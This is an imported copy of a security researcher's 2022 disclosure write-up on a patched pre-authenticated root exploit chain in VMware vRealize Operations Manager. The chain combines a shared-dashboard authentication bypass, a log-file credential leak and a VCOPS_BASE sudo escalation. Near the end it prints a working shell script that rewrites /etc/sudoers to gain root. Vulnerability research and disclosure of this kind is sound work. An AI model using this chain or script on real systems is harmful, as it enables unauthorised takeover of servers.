---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-08-09_from-shared-dash-to-root-bash-pre-authenticated-rce-in-vmware-vrealize-operation.md
original_filename: 2022-08-09_from-shared-dash-to-root-bash-pre-authenticated-rce-in-vmware-vrealize-operation.md
title: 'From Shared Dash to Root Bash :: Pre-Authenticated RCE in VMWare vRealize
  Operations Manager'
category: documents
detected_topics:
- access-control
- command-injection
- sso
- ssrf
- file-upload
- path-traversal
tags:
- imported
- documents
- access-control
- command-injection
- sso
- ssrf
- file-upload
- path-traversal
language: en
raw_sha256: 513776f70ca842ca2d4f7602e2909b59e342e0d02a7ac8faaf198048022fa8d5
text_sha256: 587d850c40f3a944d2a895312cd656d3061dc5b0e44553c3c20959b6186ddee9
ingested_at: '2026-06-28T07:32:13Z'
sensitivity: unknown
redactions_applied: true
---

# From Shared Dash to Root Bash :: Pre-Authenticated RCE in VMWare vRealize Operations Manager

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-08-09_from-shared-dash-to-root-bash-pre-authenticated-rce-in-vmware-vrealize-operation.md
- Source Type: markdown
- Detected Topics: access-control, command-injection, sso, ssrf, file-upload, path-traversal
- Ingested At: 2026-06-28T07:32:13Z
- Redactions Applied: True
- Raw SHA256: `513776f70ca842ca2d4f7602e2909b59e342e0d02a7ac8faaf198048022fa8d5`
- Text SHA256: `587d850c40f3a944d2a895312cd656d3061dc5b0e44553c3c20959b6186ddee9`


## Content

---
title: "From Shared Dash to Root Bash :: Pre-Authenticated RCE in VMWare vRealize Operations Manager"
url: "https://srcincite.io/blog/2022/08/09/from-shared-dash-to-root-bash-pre-authenticated-rce-in-vmware-vrealize-operations-manager.html"
final_url: "https://srcincite.io/blog/2022/08/09/from-shared-dash-to-root-bash-pre-authenticated-rce-in-vmware-vrealize-operations-manager.html"
authors: ["Steven Seeley (@steventseeley)"]
programs: ["VMware"]
bugs: ["Authentication bypass", "Information disclosure", "Local Privilege Escalation"]
publication_date: "2022-08-09"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 2350
---

# From Shared Dash to Root Bash :: Pre-Authenticated RCE in VMWare vRealize Operations Manager

Aug 9, 2022

![vROps](/assets/images/from-shared-dash-to-root-bash-pwning-vmware-vrealize-operations-manager/logo.jpg)

On May 27th, I reported a handful of security vulnerabilities to VMWare impacting their vRealize Operations Management Suite (vROps) appliance. In this blog post I will discuss some of the vulnerabilities I found, the motivation behind finding such vulnerabilities and how companies can protect themselves. The result of the research project concludes with a pre-authenticated remote root exploit chain using seemingly weak vulnerabilities. VMware released an advisory and patched these vulnerabilities in [VMSA-2022-0022](https://www.vmware.com/security/advisories/VMSA-2022-0022.html).

![vROps attack flow](/assets/images/from-shared-dash-to-root-bash-pwning-vmware-vrealize-operations-manager/attack-flow.png)

## Motivation

This project was motivated by the excellent blog post that [Egor](https://twitter.com/elk0kc) wrote titled [Catching bugs in VMware: Carbon Black Cloud Workload Appliance and vRealize Operations Manager](https://swarm.ptsecurity.com/catching-bugs-in-vmware-carbon-black-cloud-workload-appliance-and-vrealize-operations-manager/). Egor used a pre-authenticated SSRF to leak the highly privileged credentials and then chained it with an arbitrary file upload vulnerability to gain remote code execution as `admin`.

As always, it provides a real challenge to find high impact web vulnerabilities against a target that had been previously audited by other security researchers.

## Tested Versions

The vulnerable version at the time of testing was `8.6.3.19682901` which was the latest and deployed using the `vRealize-Operations-Manager-Appliance-8.6.3.19682901_OVF10.ova` (sha1: 4637b6385db4fbee6b1150605087197f8d03ba00) file. It was released on the 28th of April 2022 according to the [release notes](https://docs.vmware.com/en/vRealize-Operations/8.6.3/rn/vrealize-operations-863-release-notes/index.html). This was a [Photon OS](https://vmware.github.io/photon/assets/files/html/3.0/Introduction.html) Linux deployment designed for the cloud.

I also tested an older version - `8.6.2.19081814` using the `vRealize-Operations-Manager-Appliance-8.6.2.19081814_OVF10.ova` (sha1: 0363f4304e4661dde0607a3d22b4fb149d8a10a4) file and confirmed that the vulnerabilities also exist in this version. The final exploit I wrote works on both versions and should work on anything in between!

* * *

## MainPortalFilter ui Authentication Bypass (CVE-2022-31675)

  * CVSS: 5.6 (/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:L)
  * Advisory: [SRC-2022-0017](/advisories/src-2022-0017/)

The first vulnerability is in the `com.vmware.vcops.ui.util.MainPortalFilter` class:
  
  
  public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
  HttpServletRequest request = (HttpServletRequest)servletRequest;
  HttpServletResponse response = (HttpServletResponse)servletResponse;
  HttpSession session = request.getSession();
  // ...
  String servletPath = request.getServletPath().toLowerCase();
  UserContext userContext = UserContextVariable.get();
  // ...
  if (servletPath != null && servletPath.toLowerCase().startsWith("/contentpack/dashboard_dump/")) {
  response.setStatus(400);
  } else {
  String token1 = request.getParameter("t"); // 1
  
  boolean isSaasModeUser;
  boolean isResourcePath;
  boolean ssoRequested;
  try {
  if (token1 != null) { // 2
  isSaasModeUser = UserContextVariable.isAnonymousUser();
  DashboardLink dashboardLink = DashboardShareAction.getDashboardPublicLink(token1, (String)null); // 3
  if (userContext == null || dashboardLink == null || (isSaasModeUser || !userContext.getUserId().equals(dashboardLink.getUserId())) && (!isSaasModeUser || !userContext.getUserKey().equals(dashboardLink.getUserId()))) {
  //...
  if (dashboardLink != null) { // 4
  if (isResourcePath) {
  response.sendRedirect("dashboardViewer.action");
  filterChain.doFilter(request, servletResponse);
  return;
  }
  
  if (ssoRequested) {
  this.doSessionResolve(request, response);
  } else {
  session.setAttribute("token1", token1);
  session.setAttribute("allowExternalAccess", true);
  response.setHeader("Set-Cookie", "JSESSIONID=" + session.getId() + "; Path=/ui; Secure; HttpOnly; SameSite=None");
  response.sendRedirect("dashboardViewer.action?mainAction=dr");
  filterChain.doFilter(request, servletResponse); // 5
  }
  // ...
  

At _[1]_ the code looks for a `t` parameter from the incoming request and if found at _[2]_ the code tries to find a `DashboardLink` instance with the code at _[3]_. Then if a valid `DashboardLink` was found at _[4]_ the code reaches the `doFilter` at _[5]_. This allows an attacker with a valid dashboard link id to bypass authentication completely in the `/ui/` struts frontend.

When an admin creates a dashboard link to share, an entry is created into the Cassandra database:
  
  
  root@photon-machine [ ~ ]# /usr/lib/vmware-vcops/cassandra/apache-cassandra-3.11.11/bin/cqlsh.py --ssl --cqlshrc /usr/lib/vmware-vcops/user/conf/cassandra/cqlshrc
  Connected to VROps Cluster at 127.0.0.1:9042.
  [cqlsh 5.0.1 | Cassandra 3.11.11 | CQL spec 3.4.4 | Native protocol v4]
  Use HELP for help.
  vcops_user@cqlsh> select key from globalpersistence.dashboardpubliclinks;
  
  key
  --------------------------
  vcgh5fgjhs_::_ns3d5yt5vk
  
  (1 row)
  vcops_user@cqlsh>
  

It’s common to [create and share dashboard links](https://www.youtube.com/watch?v=sNpfaBr-yho), since it’s by design and even _expected_ to be embedded in a page:

![](/assets/images/from-shared-dash-to-root-bash-pwning-vmware-vrealize-operations-manager/sharing-dashboards.png)

After accessing the link without a valid session, we can view the associated dashboard:

![](/assets/images/from-shared-dash-to-root-bash-pwning-vmware-vrealize-operations-manager/access-dashboard.png)

The interesting thing to note here, is that port 443 is _supposed_ to be exposed because how else could dashboard links be shared?

## Exploitation

It’s not possible to leak data directly using this vulnerability since the server responds with a 302 redirect. At first, I thought I was up against the chicken and egg problem where I can only fire off requests to endpoints to change data, but I couldn’t use CSRF tokens because I couldn’t read them back due to the redirect! Oh my! However, on careful inspection I noticed that I could create a user and _omit_ the `secureToken` CSRF token. This is because the call to `doFilter` is hit on line 120, well before the call to `checkSecureToken` on line 345!

An additional advantage to this vulnerability is, that an attacker can link someone to a malicious website that can backdoor the application with an admin user. Putting it together though, I can backdoor the application with an admin user without interaction if I have a shared dashboard link. The user created is restricted to the `/ui/` and `/suite-api/` interfaces but I wanted access to the `/admin/` interface because there exists a [forever day](https://swarm.ptsecurity.com/catching-bugs-in-vmware-carbon-black-cloud-workload-appliance-and-vrealize-operations-manager/) remote code execution in this component by enabling SSH access.

It looks like we are going to have to hunt another vulnerability!

## SupportLogAction Information Disclosure (CVE-2022-31674)

  * CVSS: 6.5 (/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N)
  * Advisory: [SRC-2022-0019](/advisories/src-2022-0019/)

Inside of the `com.vmware.vcops.ui.action.SupportLogsAction` class we find the following entry:
  
  
  if (this.mainAction.equals("getLogFileContents")) { // 1
  lduId = this.request.getParameter("instanceId");
  instanceId = this.request.getParameter("fileName"); // 2
  boolean allowedFileName = WebUtils.isAllowedFileName(instanceId); // 3
  if (!allowedFileName) {
  this.writeJsonOutput("{status: 'can not complete request, invalid file type or pattern'}");
  return null;
  } else {
  lduId = this.request.getParameter("lduId");
  logTypeStr = this.request.getParameter("logType");
  LogType logType = LogType.fromString(logTypeStr);
  linePosition = this.request.getParameter("linePosition").isEmpty() ? -1 : Integer.parseInt(this.request.getParameter("linePosition"));
  int lineLimit = this.request.getParameter("lineLimit").isEmpty() ? 1000 : Integer.parseInt(this.request.getParameter("lineLimit"));
  if (!lduId.isEmpty() && !instanceId.isEmpty() && !lduId.isEmpty() && logType != null && lineLimit >= 0) {
  ResultDto<LogFileContentsDTO> fileContent = this.dataRetriever.getSupportLogFileContents(lduId, logType, lduId, instanceId, linePosition, lineLimit); // 4
  // ...
  } else {
  this.writeJsonOutput("{status: 'can not request, missing some params'}");
  return null;
  }
  }
  }
  

At _[1]_ the code checks for the `mainAction` parameter to be the value of `getLogFileContents`. Then at _[2]_ the code gets the `fileName` parameter and at _[3]_ the code calls `isAllowedFileName` on it. This was the giveaway for me:
  
  
  public static Boolean isAllowedFileName(String fileName) {
  if (!fileName.matches(".*\\.(?i)(log|txt|out|current)(\\.\\d+)?$")) {
  return false;
  } else {
  String nonEncodedFileName = fileName.replaceAll("(?i)(%2e|%252e)", ".");
  nonEncodedFileName = nonEncodedFileName.replaceAll("(?i)(%2f|%252f|%5c|%255c|\\\\)", "/");
  return nonEncodedFileName.contains("../") ? false : true;
  }
  }
  

Essentially the code is looking for any log file in `/storage/log/vcops/log/` directory.

## Exploitation

The issue comes down to the Pak manager writing sensitive passwords into log files:
  
  
  root@photon-machine [ /storage/log/vcops/log/pakManager ]# grep -lir "bWFpbnRlbmFuY2VBZG1pbjplMmhPYk01Y0YwWWdRNFhNU0lWeTNFemQ="
  APUAT-86018696447/apply_system_update_stderr.log
  APUAT-85018176777/apply_system_update_stderr.log
  vcopsPakManager.root.post_apply_system_update.log.1
  

For example, in `APUAT-86018696447/apply_system_update_stderr.log` we see:

`DEBUG - Calling GET: /casa/security/ping, headers: {'Content-Type': 'application/json', 'Accept': 'application/json', 'X-vRealizeOps-API-use-unsupported': 'true', 'Authorization': 'Basic bWFpbnRlbmFuY2VBZG1pbjplMmhPYk01Y0YwWWdRNFhNU0lWeTNFemQ='}`

This occurs when a legitimate Pak file is uploaded, and an install is triggered. At first it appears that the vulnerability is within the Pak manager for logging such sensitive data, but the real vulnerability is in the exposure to a lower privileged user. VMWare removed the Pak manager interface from the `/ui/` and tried to implement a little security by obscurity!

Using this vulnerability, I was able to leak the `maintenanceAdmin` user and trigger a password reset for the `admin` user because it’s the user that can login from remote via SSH:
  
  
  root@photon-machine [ ~ ]$ cat /etc/passwd | grep bash
  root:x:0:0:root:/root:/bin/bash
  admin:x:1000:1003::/home/admin:/bin/bash
  postgres:x:1001:100::/var/vmware/vpostgres/11:/bin/bash
  

At first when I checked, I thought I had enough privileges as root at this point, but it turns out I didn’t.
  
  
  admin@photon-machine [ ~ ]$ id
  uid=1000(admin) gid=1003(admin) groups=1003(admin),0(root),25(apache),28(wheel)
  admin@photon-machine [ ~ ]$ head -n1 /etc/shadow
  head: cannot open '/etc/shadow' for reading: Permission denied
  

Which means, more bug hunting and chaining!

## generateSupportBundle VCOPS_BASE Privilege Escalation (CVE-2022-31672)

  * CVSS: 7.2 (/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H)
  * Advisory: [SRC-2022-0020](/advisories/src-2022-0020/)

Inside of the `/etc/sudoers` file we find the following entry:

`admin ALL = NOPASSWD=***REDACTED*** /usr/lib/vmware-vcopssuite/utilities/bin/generateSupportBundle.py *`

This allows low privileged users to run the script as root using `sudo`. Inside of the `generateSupportBundle.py` file we find:
  
  
  try:
  VCOPS_BASE = os.environ['VCOPS_BASE'] # 1
  except KeyError as ex:
  # In cloudvm, this could happen - for example, if caller like cis
  # has not called the /etc/profile.d/vcops.sh.
  filePath = os.path.dirname(os.path.realpath( __file__ ))
  # Since this file is located at $VCOPS_BASE/tools, we can use relative path
  VCOPS_BASE =  os.path.abspath(filePath + "/..")
  VCOPS_BASE=VCOPS_BASE.replace('\\', '/')
  commonLib = VCOPS_BASE + '/install/'
  sys.path.append(commonLib)
  

The code heavily depends on the `VCOPS_BASE` environment variable at _[1]_. When running the script, the following code is executed:
  
  
  ds = []
  if options.get("action") is None:
  options["action"] = 'create'
  #...
  if options.get("action") == 'create':
  runGssTroubleShootingScript() # 2
  

The `runGssTroubleShootingScript` method is called if action is not supplied at _[2]_.
  
  
  def runGssTroubleShootingScript():
  gss_troubleshooting_script_path = os.path.join(find_vcops_base_path(), "..", "vmware-vcopssuite", "utilities", "bin") # 3
  
  try:
  output = subprocess.Popen("{0}/gss_troubleshooting.sh".format(gss_troubleshooting_script_path))
  except subprocess.CalledProcessError as e:
  print ('Failed to run gss troubleshooting script, error code {0}:'.format(e.returncode))
  

At _[3]_ , that method attempts to call an executable script as root and uses `find_vcops_base_path` to get the path location of the script:
  
  
  def find_vcops_base_path():
  """Finds the VCOPS_BASE environment variable.
  @return: the VCOPS_BASE path or an exception if it cannot be found.
  """
  if 'VCOPS_BASE' in os.environ:
  vcops_base_path = os.environ['VCOPS_BASE'] # 4
  elif 'ALIVE_BASE' in os.environ:
  vcops_base_path = os.environ['ALIVE_BASE']
  # ...
  return vcops_base_path # 5
  

At _[4]_ and _[5]_ if the `VCOPS_BASE` environment variable is set, it will return that.

## Exploitation

All an attacker needs to do is setup the environment variable before calling the script to elevate privileges.
  
  
  #!/bin/sh
  mkdir -p poc
  mkdir -p vmware-vcopssuite/utilities/bin/
  cat <<EOT > vmware-vcopssuite/utilities/bin/gss_troubleshooting.sh
  #!/bin/sh
  echo "admin ALL = NOPASSWD=***REDACTED*** >> /etc/sudoers
  EOT
  chmod 755 vmware-vcopssuite/utilities/bin/gss_troubleshooting.sh
  sudo VCOPS_BASE=poc /usr/lib/vmware-vcopssuite/python/bin/python /usr/lib/vmware-vcopssuite/utilities/bin/generateSupportBundle.py test > /dev/null 2>&1
  sudo rm -rf poc
  sudo rm -rf vmware-vcopssuite
  sudo sh
  sudo sed -i '$ d' /etc/sudoers
  

## Proof of Concept

The exploit is called DashOverride and you can download it [here](https://github.com/sourceincite/DashOverride).

![Gaining pre-authenticated remote code execution as root!](/assets/images/from-shared-dash-to-root-bash-pwning-vmware-vrealize-operations-manager/poc.gif)

* * *

## Conclusion

Each of the CVSS scores for the 3 vulnerabilities are rated moderate/high and when considered on their own, they are quite weak. But chained together their impact is significant and depending on your threat model, the authentication bypass scenario could pose a real threat if dashboard links are shared around within your organization or exposed on the perimeter.

Some of you may ask, well did you get a bounty for any of this? In which the short answer is… _No_.

## References

  * <https://www.vmware.com/security/advisories/VMSA-2021-0004.html>
  * <https://www.vmware.com/security/advisories/VMSA-2021-0018.html>
  * <https://www.vmware.com/security/advisories/VMSA-2021-0021.html>
  * <https://docs.vmware.com/en/vRealize-Operations/8.6/com.vmware.vcom.api.doc/GUID-C27B4402-56DF-45D6-8813-EC2617D24407.html>
  * <https://swarm.ptsecurity.com/catching-bugs-in-vmware-carbon-black-cloud-workload-appliance-and-vrealize-operations-manager/>
